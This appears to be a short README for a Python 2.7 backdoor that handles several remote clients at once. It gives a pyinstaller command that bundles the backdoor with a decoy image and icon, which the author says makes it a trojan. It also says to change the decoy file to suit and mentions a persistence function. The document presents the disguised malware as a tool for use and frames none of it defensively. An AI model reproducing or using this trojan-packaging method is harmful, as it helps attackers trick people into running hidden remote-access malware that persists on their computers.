# multi-client-backdoor
Allows the client handler to have co-current backdoor session like metaslploit 

I like to attach a file and its appropriate file icon together with a malware (making it a trojan) C:\Python27\Scripts\pyinstaller.exe backdoor.py] --onefile --noconsole --add-data “C:/Downloads/pic.jpg;.” --icon C:/Downloads/file_name.ico
Written in python 2.7, make sure to use the appropriate interrupter. The sample file is pic.jpg in the backdoor.py. Make sure to modify the subprocess file call to whatever front file you want to use, and reflect it in the compiler command.

The backdoor also has a persostence mechanism by def (become_per) function definition
